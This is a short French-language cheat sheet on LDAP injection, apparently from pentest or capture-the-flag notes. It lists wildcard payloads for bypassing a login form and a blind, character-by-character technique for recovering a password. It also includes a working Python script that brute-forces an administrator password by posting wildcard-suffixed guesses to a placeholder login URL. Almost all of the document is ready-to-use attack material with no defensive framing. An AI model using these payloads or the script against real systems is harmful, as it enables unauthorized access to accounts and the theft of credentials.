# LDAP

### Bypass de formulaire

```
# Cas simple
user=*
password=*
--> (&(user=*)(password=*))

# Autres exemples
user=*)(&
password=*)(&
--> (&(user=*)(&)(password=*)(&))
```

### Sortir des données

```
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO

# 
```

#### Exemple de code python pour récupérer un mot de passe

```
import requests

pwd = ''
pwd_tmp = ''

alpha = ('-','{','}','_','~','[',']','#','&','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z')
	 
for i in range(0,30):
    for x in alpha :
        url = 'http://<URL>/login'
        myobj = {'username': '<user>','password': str(pwd) + str(x) + '*'}
        req = requests.post(url, data = myobj, verify=False)
        if 'Auth' not in req.url:
            pwd_tmp = str(pwd) + str(x)
            pwd = pwd_tmp 
            break

print(pwd)
```
